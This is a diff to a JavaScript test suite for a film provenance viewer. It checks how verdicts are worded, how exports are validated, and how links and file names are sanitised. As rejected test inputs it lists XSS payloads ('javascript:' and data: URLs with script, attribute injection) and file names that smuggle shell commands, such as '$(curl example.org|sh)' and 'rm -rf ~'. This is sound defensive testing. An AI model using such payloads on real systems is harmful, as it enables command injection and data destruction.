@@ -19,7 +19,14 @@ import {
 	timeStampSentence,
 	withheldSentence,
 	safeLink,
+	pageLink,
+	sameOriginAddress,
+	sourceTypeLink,
+	youtubeIdOf,
+	hashCommands,
 	TONE_WORDS,
+	RECORD_TONE_WORDS,
+	RECORD_NOTE,
 	groupHash,
 	formatBytes,
 	assertViewable,
@@ -280,12 +287,27 @@ describe("the file, the signer and the identity, read apart (D57)", () => {
 		});
 		expect(untrusted.file.status).toBe("changed");
 		expect(untrusted.signer.status).toBe("unrecognised_issuer");
+		// Trusted only when the record says the issuer was recognised, never
+		// because no failure happens to be listed (D71).
+		const silent = (issuerRecognised) =>
+			resultsOf({
+				...exampleV1,
+				signature: {
+					...exampleV1.signature,
+					status: "valid",
+					failures: [],
+					issuerRecognised,
+				},
+			}).signer.status;
+		expect(silent(true)).toBe("trusted");
+		expect(silent(false)).toBe("unrecognised_issuer");
+		expect(silent(undefined)).toBe("unrecognised_issuer");
 	});
 
 	it("puts each result in plain words, its tone also in words", () => {
 		expect(fileVerdict({ status: "matches" })).toMatchObject({
 			tone: "good",
-			headline: "The film is as it was signed",
+			headline: "The film matched its signature when it was signed",
 		});
 		expect(fileVerdict({ status: "changed" }).tone).toBe("bad");
 		expect(fileVerdict({ status: "unchecked" }).tone).toBe("caution");
@@ -294,17 +316,49 @@ describe("the file, the signer and the identity, read apart (D57)", () => {
 			commonName: "Dev",
 		});
 		expect(s.tone).toBe("caution");
-		expect(s.headline).toBe("Signed by Dev; signer not yet on the trust list");
+		expect(s.headline).toBe("The record names Dev; not on the trust list");
 		expect(s.detail).toMatch(
 			/not on the public Content Credentials trust list/,
 		);
 		// The signer's result says nothing about whether the content changed.
 		expect(s.detail).not.toMatch(/changed/);
 		expect(signerVerdict({ status: "invalid", failures: ["x.y"] }).detail).toBe(
-			"Failures: x.y.",
+			"The record lists these failures: x.y.",
 		);
 		expect(signerVerdict(undefined).headline).toBe("No Content Credentials");
 		expect(Object.keys(TONE_WORDS)).toEqual(["good", "caution", "bad"]);
+	});
+
+	it("words the three results as the record's account, never as a check this page made (D71)", () => {
+		expect(Object.keys(RECORD_TONE_WORDS)).toEqual(["good", "caution", "bad"]);
+		const said = [
+			RECORD_NOTE,
+			...Object.values(RECORD_TONE_WORDS),
+			...["matches", "changed", "unchecked"].flatMap((status) =>
+				Object.values(fileVerdict({ status })),
+			),
+			...["trusted", "unrecognised_issuer", "invalid", "absent"].flatMap(
+				(status) => Object.values(signerVerdict({ status, commonName: "Dev" })),
+			),
+			...["trusted", "unrecognised_issuer", "invalid"].flatMap((status) =>
+				Object.values(identityVerdict({ status, name: "A", roles: [] })),
+			),
+		].join(" ");
+		// Nothing in the present tense that reads as this page's finding.
+		for (const claim of [
+			/checks out/i,
+			/\bis on the\b/i,
+			/\bis as it was signed\b/i,
+			/, verified\b/,
+			/\btrust\.$/,
+		])
+			expect(said, String(claim)).not.toMatch(claim);
+		expect(RECORD_NOTE).toMatch(/has not checked the film/);
+		for (const status of ["matches", "changed", "unchecked"])
+			expect(fileVerdict({ status }).detail).toMatch(/^The record says/);
+		expect(
+			signerVerdict({ status: "trusted", commonName: "Dev" }).detail,
+		).toMatch(/^The record says .* was on the Content Credentials trust list/);
 	});
 
 	it("says who the creator is, and whether anyone vouches for it", () => {
@@ -312,7 +366,7 @@ describe("the file, the signer and the identity, read apart (D57)", () => {
 			tone: "caution",
 			headline: "Creator: A. Example, self-declared",
 			detail:
-				"Their identity is signed into the file, apart from the signature, and checks out, but no issuer that verification tools recognise vouches for it. Read the name as the creator's own statement.",
+				"The record says their identity was signed into the file, apart from the signature, and validated, but no issuer that verification tools recognise vouched for it. Read the name as the creator's own statement.",
 		});
 		expect(
 			identityVerdict({
@@ -321,7 +375,19 @@ describe("the file, the signer and the identity, read apart (D57)", () => {
 				issuer: "Example ID",
 				roles: ["cawg.editor"],
 			}).headline,
-		).toBe("Editor: A. Example, verified");
+		).toBe("Editor: A. Example, recorded as verified");
+		// A role is looked up only among the table's own words.
+		expect(
+			identityVerdict({
+				status: "trusted",
+				name: "A. Example",
+				roles: ["constructor", "__proto__"],
+			}).headline,
+		).toBe("Named: A. Example, recorded as verified");
+		expect(
+			identityVerdict({ status: "trusted", name: "A", roles: "cawg.editor" })
+				.headline,
+		).toBe("Named: A, recorded as verified");
 		expect(
 			identityVerdict({ status: "invalid", name: "X", roles: [] }).tone,
 		).toBe("bad");
@@ -354,7 +420,11 @@ describe("the file, the signer and the identity, read apart (D57)", () => {
 	it("counts what was left out without saying what", () => {
 		expect(withheldSentence({ fromRecord: 0, fromSignedFile: 0 })).toBeNull();
 		expect(withheldSentence({ fromRecord: 2, fromSignedFile: 1 })).toBe(
-			"The creator chose to leave out 2 details from this record and 1 detail from its sources' credentials in the signed film. What was left out is not shown; the signed film says where something was removed.",
+			"The creator chose to leave out 2 details from this record and 1 detail from its sources' credentials in the signed film. What was left out is not shown. Where a detail was removed from inside a source's credentials, the signed film records that something was removed there; credentials left out whole leave no mark.",
+		);
+		// Nothing is said of the signed film when nothing was left out of it.
+		expect(withheldSentence({ fromRecord: 2, fromSignedFile: 0 })).toBe(
+			"The creator chose to leave out 2 details from this record. What was left out is not shown.",
 		);
 	});
 
@@ -583,5 +653,260 @@ describe("untrackedItems", () => {
 				],
 			})[0].position,
 		).toBe("unknown");
+	});
+});
+
+describe("what an export, or a link to the page, may not do (D71)", () => {
+	const withFilm = (film) => ({
+		...example,
+		film: { ...example.film, ...film },
+	});
+	const withSection = (section) => ({
+		...example,
+		composition: {
+			...example.composition,
+			picture: {
+				...example.composition.picture,
+				intervals: [
+					{ ...example.composition.picture.intervals[0], ...section },
+				],
+			},
+		},
+	});
+
+	it("refuses a length or a time that is not a number it can draw", () => {
+		// JSON has no Infinity, but "1e999" parses to it.
+		const huge = JSON.parse('{"n": 1e999}').n;
+		expect(huge).toBe(Infinity);
+		for (const durationSeconds of [huge, -1, "96", 1e9, Number.NaN])
+			expect(
+				() => assertViewable(withFilm({ durationSeconds })),
+				String(durationSeconds),
+			).toThrow(/length is not a number of seconds/);
+		expect(assertViewable(withFilm({ durationSeconds: null }))).toBeTruthy();
+		for (const section of [
+			{ end: huge },
+			{ start: "0" },
+			{ start: 5, end: 2 },
+			{ start: -1 },
+		])
+			expect(
+				() => assertViewable(withSection(section)),
+				JSON.stringify(section),
+			).toThrow(/a section's times are not numbers in order/);
+		expect(() =>
+			assertViewable({
+				...example,
+				composition: {
+					...example.composition,
+					picture: {
+						...example.composition.picture,
+						intervals: Array.from({ length: 20001 }, (_, n) => ({
+							start: n,
+							end: n + 1,
+							positions: [],
+						})),
+					},
+				},
+			}),
+		).toThrow(/too many sections/);
+	});
+
+	it("refuses a kind of material it does not draw, which would otherwise reach a style and a class name", () => {
+		for (const positions of [
+			["captured) url(https://example.org/x"],
+			["constructor"],
+			"captured",
+			[42],
+		])
+			expect(
+				() => assertViewable(withSection({ positions })),
+				JSON.stringify(positions),
+			).toThrow(/a kind of material this viewer does not know/);
+		expect(() => assertViewable(withFilm({ position: "x y" }))).toThrow(
+			/the film is of a kind/,
+		);
+		expect(() =>
+			assertViewable({
+				...example,
+				ingredients: [{ ...example.ingredients[0], position: "x" }],
+			}),
+		).toThrow(/list of sources/);
+		expect(() =>
+			assertViewable({
+				...example,
+				vocabulary: {
+					...example.vocabulary,
+					positions: [{ id: "x", label: "X" }],
+				},
+			}),
+		).toThrow(/vocabulary/);
+		expect(() =>
+			assertViewable({
+				...example,
+				composition: {
+					...example.composition,
+					audio: {
+						...example.composition.audio,
+						mixed: { seconds: 1, combos: { "captured+nope": { seconds: 1 } } },
+					},
+				},
+			}),
+		).toThrow(/sound timeline.*a mix names a kind/);
+	});
+
+	it("refuses lists and numbers of the wrong kind, saying what, and never crashes on them", () => {
+		for (const [change, says] of [
+			[
+				{ signedFile: { ...example.signedFile, bytes: "412345678" } },
+				/signed file/,
+			],
+			[{ signedFile: { ...example.signedFile, sha256: "<b>" } }, /signed file/],
+			[{ signedFile: null }, /signed file/],
+			[{ signer: { ...example.signer, failures: "none" } }, /signature/],
+			[{ signer: null }, /signature/],
+			[{ file: null }, /what was checked/],
+			[
+				{ identity: { ...example.identity, roles: "cawg.creator" } },
+				/identity/,
+			],
+			[{ ingredients: {} }, /list of sources/],
+			[{ untracked: [{ startSeconds: "0" }] }, /untracked/],
+			[{ statement: null }, /creator statement/],
+			[{ film: [] }, /does not describe a film/],
+		])
+			expect(
+				() => assertViewable({ ...example, ...change }),
+				JSON.stringify(change).slice(0, 60),
+			).toThrow(says);
+		for (const notAnExport of [null, [], "x", 3])
+			expect(() => assertViewable(notAnExport)).toThrow(
+				/not a provenance tracker/,
+			);
+		// Both real formats still load.
+		expect(assertViewable(example)).toBe(example);
+		expect(assertViewable(exampleV1)).toBe(exampleV1);
+	});
+
+	it("looks a word up only among a table's own, so an odd key prints as text", () => {
+		const said = mixSentence(
+			{
+				mixed: {
+					seconds: 10,
+					combos: { "constructor+captured": { seconds: 10 } },
+				},
+			},
+			"picture",
+		);
+		expect(said).toBe("layers constructor with camera footage");
+	});
+
+	it("links a source type only when it is an IPTC vocabulary address", () => {
+		const iptc =
+			"http://cv.iptc.org/newscodes/digitalsourcetype/digitalCapture";
+		expect(sourceTypeLink(iptc)).toBe(iptc);
+		expect(sourceTypeLink(iptc.replace("http:", "https:"))).toBe(
+			iptc.replace("http:", "https:"),
+		);
+		// safeLink alone would refuse the genuine ones, which are http.
+		expect(safeLink(iptc)).toBeNull();
+		for (const bad of [
+			"javascript:alert(document.domain)",
+			"http://cv.iptc.org.example.org/newscodes/digitalsourcetype/digitalCapture",
+			"http://cv.iptc.org/newscodes/digitalsourcetype/x?next=https://example.org",
+			"http://cv.iptc.org/newscodes/digitalsourcetype/../../x",
+			"http://user@cv.iptc.org/newscodes/digitalsourcetype/digitalCapture",
+			"https://example.org/",
+			"",
+			null,
+			{},
+		])
+			expect(sourceTypeLink(bad), String(bad)).toBeNull();
+		for (const i of example.ingredients)
+			if (i.digitalSourceType)
+				expect(sourceTypeLink(i.digitalSourceType)).toBe(i.digitalSourceType);
+	});
+
+	it("checks a link the page passes in: https, or the page's own origin", () => {
+		const page = "https://example.org/films/morning-market";
+		expect(pageLink("https://media.example.org/f.mp4", page)).toBe(
+			"https://media.example.org/f.mp4",
+		);
+		expect(pageLink("/files/f.mp4", page)).toBe(
+			"https://example.org/files/f.mp4",
+		);
+		expect(pageLink("f.mp4", "http://localhost:3000/demo/")).toBe(
+			"http://localhost:3000/demo/f.mp4",
+		);
+		for (const bad of [
+			"javascript:alert(1)",
+			"JaVaScRiPt:alert(1)",
+			"data:text/html,<script>alert(1)</script>",
+			"http://media.example.org/f.mp4",
+			"https://user:pw@media.example.org/f.mp4",
+			"#",
+			"",
+			"   ",
+			null,
+			undefined,
+			7,
+		])
+			expect(pageLink(bad, page), String(bad)).toBeNull();
+		expect(pageLink("https://example.org/f.mp4", "not a page")).toBeNull();
+	});
+
+	it("holds the demo page's address-bar options to its own origin", () => {
+		const page = "http://localhost:3000/index.html?export=x";
+		expect(sameOriginAddress("./example/other.provenance.json", page)).toBe(
+			"http://localhost:3000/example/other.provenance.json",
+		);
+		for (const bad of [
+			"https://example.org/forged.provenance.json",
+			"//example.org/forged.provenance.json",
+			"http://localhost:3001/forged.provenance.json",
+			"javascript:alert(1)",
+			"data:application/json,{}",
+			"",
+			null,
+		])
+			expect(sameOriginAddress(bad, page), String(bad)).toBeNull();
+		expect(youtubeIdOf("dQw4w9WgXcQ")).toBe("dQw4w9WgXcQ");
+		for (const bad of [
+			'x" onload="alert(1)',
+			"dQw4w9WgXcQ&x=1",
+			"short",
+			"",
+			null,
+			5,
+		])
+			expect(youtubeIdOf(bad), String(bad)).toBeNull();
+	});
+
+	it("puts a file name into a command to paste only when it is plain", () => {
+		expect(hashCommands("morning-market.signed.v1.mp4")).toEqual({
+			windows: 'certutil -hashfile "morning-market.signed.v1.mp4" SHA256',
+			unix: 'shasum -a 256 "morning-market.signed.v1.mp4"',
+			named: true,
+		});
+		expect(hashCommands("Peña (final cut) 2.mov").named).toBe(true);
+		for (const name of [
+			"$(curl example.org|sh).mp4",
+			"`id`.mp4",
+			'a" & calc & ".mp4',
+			"%USERPROFILE%.mp4",
+			"film;rm -rf ~.mp4",
+			"-rf.mp4",
+			"a\\b.mp4",
+			"a\nb.mp4",
+			"",
+			null,
+		]) {
+			const c = hashCommands(name);
+			expect(c.named, String(name)).toBe(false);
+			expect(c.unix).toBe("shasum -a 256 <the file you downloaded>");
+			expect(c.windows).toBe(
+				"certutil -hashfile <the file you downloaded> SHA256",
+			);
+		}
 	});
 });
